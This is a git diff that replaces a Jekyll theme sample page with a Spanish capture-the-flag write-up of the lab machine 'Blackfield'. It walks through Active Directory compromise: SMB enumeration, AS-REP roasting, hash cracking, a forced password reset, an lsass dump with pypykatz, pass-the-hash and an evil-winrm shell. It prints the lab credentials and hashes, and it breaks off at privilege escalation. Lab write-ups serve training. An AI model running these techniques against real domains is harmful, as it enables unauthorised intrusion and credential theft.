@@ -5,120 +5,337 @@ published: true
 
 Text can be **bold**, _italic_, ~~strikethrough~~ or `keyword`.
 
-[Link to another page](another-page).
+## [](#header-2)Fase de reconocimiento
 
-There should be whitespace between paragraphs.
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.192 -oG ports
 
-There should be whitespace between paragraphs. We recommend including a README, or a file with information about your project.
+nmap -sCV -p<ports> 10.10.10.192 -oN scanports
 
-# [](#header-1)Header 1
+- `Puertos abiertos, por donde se puede atacar`
 
-This is a normal paragraph following a header. GitHub is a code hosting platform for version control and collaboration. It lets you and others work together on projects from anywhere.
+  - puerto 88 -> kerberos
+  - puerto 445 -> smb
+  - puerto 5985 -> winrm
+  - puerto 389 -> ldap
 
-## [](#header-2)Header 2
+- `Primero vamos a enumerar el puerto smb`
 
-> This is a blockquote following a header.
->
-> When something is important enough, you do it even if the odds are not in your favor.
+        smbclient -L \\\\10.10.10.192\\
+        Password for [WORKGROUP\root]:
 
-### [](#header-3)Header 3
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        forensic        Disk      Forensic / Audit share.
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        profiles$       Disk
+        SYSVOL          Disk      Logon server share
 
-```js
-// Javascript code with syntax highlighting.
-var fun = function lang(l) {
-  dateformat.i18n = require('./lang/' + l)
-  return true;
-}
-```
+- `Tambien lo podemos enumerar con smbmap`
 
-```ruby
-# Ruby code with syntax highlighting
-GitHubPages::Dependencies.gems.each do |gem, version|
-  s.add_dependency(gem, "= #{version}")
-end
-```
+        smbmap -H 10.10.10.192 -u "null"
+        [+] Guest session       IP: 10.10.10.192:445    Name: 10.10.10.192
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        forensic                                                NO ACCESS       Forensic / Audit share.
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share
+        profiles$                                               READ ONLY
+        SYSVOL                                                  NO ACCESS       Logon server share
+- 
+        smbmap -H 10.10.10.192 "null" -r profiles$
 
-#### [](#header-4)Header 4
+de esta manera podemos ver mas informacion (en las carpetas que tenemos privilegios)
+en la carpeta profiles$ vamos a encontras mas 300 usurios del dominio pero hay
+que ver cuales son validas con el `DC (Domain Controller)`
 
-*   This is an unordered list following a header.
-*   This is an unordered list following a header.
-*   This is an unordered list following a header.
+- Vamos a validar estos usuarios con kerbrute
 
-##### [](#header-5)Header 5
+        smbmap -H 10.10.10.192 -u "null" -r profiles$ | awk 'NF {print $NF}' > users 
 
-1.  This is an ordered list following a header.
-2.  This is an ordered list following a header.
-3.  This is an ordered list following a header.
+este oneliner nos va a volcar solo la parte de los usuarios y nos va a guardar
+en users.txt
 
-###### [](#header-6)Header 6
+## [](header-2)Kerbrute
 
-| head1        | head two          | three |
-|:-------------|:------------------|:------|
-| ok           | good swedish fish | nice  |
-| out of stock | good and plenty   | nice  |
-| ok           | good `oreos`      | hmm   |
-| ok           | good `zoute` drop | yumm  |
+Esta herramienta es de impacket o tambien lo pueden bajar desde el repositorio de ropnop en github
 
-### There's a horizontal rule below this.
+        kerbrute -user users.txt -dc-ip 10.10.10.192 -domain blackfield.local 
 
-* * *
+        Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
-### Here is an unordered list:
+        [*] Valid user => audit2020
+        [*] Valid user => support [NOT PREAUTH]
+        [*] Valid user => svc_backup
+        [*] No passwords were discovered :'(
 
-*   Item foo
-*   Item bar
-*   Item baz
-*   Item zip
+tenemos 3 usuarios validos del dominio
 
-### And an ordered list:
+## [](header-2)ASREPRoast Attack
 
-1.  Item one
-1.  Item two
-1.  Item three
-1.  Item four
+       GetNPUsers.py blackfield.local/ -no-pass -usersfile users.valid
 
-### And a nested list:
+       Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
-- level 1 item
-  - level 2 item
-  - level 2 item
-    - level 3 item
-    - level 3 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-- level 1 item
+       [-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
+       $krb5asrep$23$support@BLACKFIELD.LOCAL:59e765a5b5479d524b397f80a2c4dc2b
+       $ae069138d2d70f706a8b5df2a13b0ac2782c946bd771ce82da9fc2483ecdd807e7a487
+       78b3076d74fbf3984389758a56b7c1e85fb2860ee9e8b2
+       [-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
 
-### Small image
+y logramos visualizar un hash que podemos crackear con john the ripper
 
-![](https://assets-cdn.github.com/images/icons/emoji/octocat.png)
+## [](header-2)Cracking Hash
 
-### Large image
+      john --wordlist=/usr/share/wordlists/rockyou.txt hash
+      Using default input encoding: UTF-8
+      Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+      Press 'q' or Ctrl-C to abort, almost any other key for status
+      #00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
+      1g 0:00:01:37 DONE (2023-03-08 14:04) 0.01025g/s 147055p/s 147055c/s 147055C/s #00p3r..#+*=%
+      Use the "--show" option to display all of the cracked passwords reliably
+      Session completed.
 
-![](https://guides.github.com/activities/hello-world/branching.png)
+y tuvimos exito en romper el hash -> support:#00^BlackKnight
+
+- Verificamos que la contraseña obtenida sea valida
+
+      crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight'
+      SMB    10.10.10.192    445    DC01     [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local)
+      SMB    10.10.10.192    445    DC01     [+] BLACKFIELD.local\suppoort:#00^BlackKnight
+
+      ES VALIDA!!!
+
+## [](header-2)Enumeracion con credenciales validas
+
+     rpcclient -U "support%#00^BlackKnight" 10.10.10.192
+     rpcclient $> enumdomusers
+     rpcclient $> enumdomgroups
+     rpcclient $> querygroupmem 0x200
+        rid:[0x1f4] attr:[0x7]
+     rpcclient $> queryuser 0x1f4 -> de esta manera podemos enumerar gran parte de los usuarios del dominio
+
+tenemos contraseñas validas pero no nos podemos conectar de manera remota a la maquina, en este caso vamos a
+utilizar una herramienta muy conocida en este campo de AD que es el famoso Bloodhound. La mayoria de las 
+veces se corre bloodhound una vez dentro de la maquina pero en esta vamos a hacerlo con bloodhound-python
+
+## [](header-2)Bloodhound-Python
+
+    bloodhound-python -c all -u 'support' -p '#00^BlackKnight' -ns 10.10.10.192 -dc dc01.blackfield.local -d blackfield.local
 
 
-### Definition lists can be used with HTML syntax.
+## [](header-2)Iniciando neo4j & bloodhound
 
-<dl>
-<dt>Name</dt>
-<dd>Godzilla</dd>
-<dt>Born</dt>
-<dd>1952</dd>
-<dt>Birthplace</dt>
-<dd>Japan</dd>
-<dt>Color</dt>
-<dd>Green</dd>
-</dl>
+    neo4j console
+    bloodhound
 
-```
-Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
-```
+- Una vez dentro de bloodhound vamos a cargar toda la data que nos volco bloodhound-python, esto nos
+respresentara de manera grafica las rutas por donde debemos entrar o atacar y convertirnos en administradores
+del dominio
 
-```
-The final element.
-```
+1. Find Shortest Paths to Domain Admins
+2. Find Paths from Kerberoastable Users
+3. Find AS-REP Roastable Users
+
+- vemos que es usuario support es asreproasteable. Le damos un clic derecho al usuario y lo seteamos a Mark User as Owned.
+Vamos a Node Info y miramos donde hay 1. Vemos que el usuario support puede forzar un cambio de contraseña al usuario audit2020 -> es decir que tiene privilegios
+sobre la maquina audit2020
+
+no tenemos acceso a la maquina pero existe un metodo para cambiar la contraseña por 
+
+    net rpc password -> o con rpcclient
+    rpcclient -U "support%#00^BlackKnight" 10.10.10.192
+    rpcclient $> setuserinfo2 audit2020 24 atreus123!
+
+rapidamente lo validamos con crackmapexec
+
+    crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'atreus123!'
+    SMB    10.10.10.192    445    DC01    [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) 
+    SMB    10.10.10.192    445    DC01    [+] BLACKFIELD.local\audit2020:atreus123!
+
+ya tenemos credenciales validas de audit2020 -> atreus123! asique en este punto vamos a enumerar 
+las carpetas que contiene el usuario audit2020
+
+    smbmap -H 10.10.10.192 -u 'audit2020' -p 'atreus123!'
+    [+] IP: 10.10.10.192:445        Name: dc01.blackfield.local
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        forensic                                                READ ONLY       Forensic / Audit share.
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share
+        profiles$                                               READ ONLY
+        SYSVOL                                                  READ ONLY       Logon server share
+
+ya tenemos acceso a la carpeta forensic
+
+    smbmap -H 10.10.10.192 -u 'audit2020' -p 'atreus123!' -r forensic
+    [+] IP: 10.10.10.192:445        Name: dc01.blackfield.local
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        forensic                                                READ ONLY
+        .\forensic\*
+        dr--r--r--                0 Sun Feb 23 12:10:16 2020    .
+        dr--r--r--                0 Sun Feb 23 12:10:16 2020    ..
+        dr--r--r--                0 Sun Feb 23 15:14:37 2020    commands_output
+        dr--r--r--                0 Thu May 28 17:29:24 2020    memory_analysis
+        dr--r--r--                0 Fri Feb 28 19:30:34 2020    tools
+
+    smbmap -H 10.10.10.192 -u 'audit2020' -p 'atreus123!' -r forensic/memory_analysis
+    [+] IP: 10.10.10.192:445        Name: dc01.blackfield.local
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        forensic                                                READ ONLY
+        .\forensicmemory_analysis\*
+        dr--r--r--                0 Thu May 28 17:29:24 2020    .
+        dr--r--r--                0 Thu May 28 17:29:24 2020    ..
+        fr--r--r--         37876530 Thu May 28 17:29:24 2020    conhost.zip
+        fr--r--r--         24962333 Thu May 28 17:29:24 2020    ctfmon.zip
+        fr--r--r--         23993305 Thu May 28 17:29:24 2020    dfsrs.zip
+        fr--r--r--         18366396 Thu May 28 17:29:24 2020    dllhost.zip
+        fr--r--r--          8810157 Thu May 28 17:29:24 2020    ismserv.zip
+        fr--r--r--         41936098 Thu May 28 17:29:24 2020    lsass.zip
+        fr--r--r--         64288607 Thu May 28 17:29:24 2020    mmc.zip
+        fr--r--r--         13332174 Thu May 28 17:29:24 2020    RuntimeBroker.zip
+        fr--r--r--        131983313 Thu May 28 17:29:24 2020    ServerManager.zip
+        fr--r--r--         33141744 Thu May 28 17:29:24 2020    sihost.zip
+        fr--r--r--         33756344 Thu May 28 17:29:24 2020    smartscreen.zip
+        fr--r--r--         14408833 Thu May 28 17:29:24 2020    svchost.zip
+        fr--r--r--         34631412 Thu May 28 17:29:24 2020    taskhostw.zip
+        fr--r--r--         14255089 Thu May 28 17:29:24 2020    winlogon.zip
+        fr--r--r--          4067425 Thu May 28 17:29:24 2020    wlms.zip
+        fr--r--r--         18303252 Thu May 28 17:29:24 2020    WmiPrvSE.zip
+
+lsass.zip nos llama la atencion porque hay una utilidad pypykatz con la cual podriamos ver informacion relevante
+dumpeada a nivel de memoria. Esto quiere decir que anteriormente esta maquina ya a sido pwneada por alguien
+
+    smbmap -H 10.10.10.192 -u 'audit2020' -p 'atreus123!' --download forensic/memory_analysis/lsass.zip
+
+        [+] Starting download: forensic\memory_analysis\lsass.zip (41936098 bytes)
+        [+] File output to: /home/atreus/HTB/blackfield/content/10.10.10.192-forensic_memory_analysis_lsass.zip
+
+## [](#header-2)pypykatz (anteriormente extraimos lo que existe en lsass.zip)
+
+unzipeamos el lsass.zip para despues dumpear el contenido con pypykatz
+
+    pypykatz lsa minidump lsass.DMP
+
+    INFO:pypykatz:Parsing file lsass.DMP
+    FILE: ======== lsass.DMP =======
+    == LogonSession ==
+    authentication_id 406458 (633ba)
+    session_id 2
+    username svc_backup
+    domainname BLACKFIELD
+    logon_server DC01
+    logon_time 2020-02-23T18:00:03.423728+00:00
+    sid S-1-5-21-4194615774-2175524697-3563712290-1413
+    luid 406458
+        == MSV ==
+                Username: svc_backup
+                Domain: BLACKFIELD
+                LM: NA
+                NT: 9658d1d1dcd9250115e2205d9f48400d
+                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
+        == WDIGEST [633ba]==
+                username svc_backup
+                domainname BLACKFIELD
+                password None
+                password (hex)
+        == Kerberos ==
+                Username: svc_backup
+                Domain: BLACKFIELD.LOCAL
+        == WDIGEST [633ba]==
+                username svc_backup
+                domainname BLACKFIELD
+                password None
+                password (hex)
+
+tenemos hashes NT que nos sirve para realizar PassTheHash sin proporcionar contraseña en texto claro
+
+- HASH NT del usuario svc_backup -> 9658d1d1dcd9250115e2205d9f48400d tambien obtuvimos el NT del usuario Admin del dominio
+pero son invalidas, ahora vamos a validar el NT del usuario svc_backup
+
+## [](#header-2)SHELL svc_backup
+
+    crackmapexec smb 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
+    SMB     10.10.10.192    445    DC01    [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+    SMB     10.10.10.192    445    DC01    [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
+
+el hash NT es correcto, sirve para conectarnos a la maquina y conseguir una sesion remota de comandos
+
+## [](#header-2)Vamos a comprobar con winrm
+
+    crackmapexec winrm 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
+
+    SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
+    HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
+    WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
+
+y nos muestra un Pwned!! esto quiere decir que podemos conectarnos con evil-winrm
+
+    evil-winrm -i blackfield.local -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
+
+    Evil-WinRM shell v3.4
+
+    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+    Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+    Info: Establishing connection to remote endpoint
+
+    *Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
+     blackfield\svc_backup
+
+esta seria la primera parte de la maquina, tenemos ejecucion remota de comandos y ya podemos ver la flag
+(user.txt) esta ubicada en C:\Users\svc_backup\Desktop\users.txt
+
+## [](#header-2)Escalada de Privilegios
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
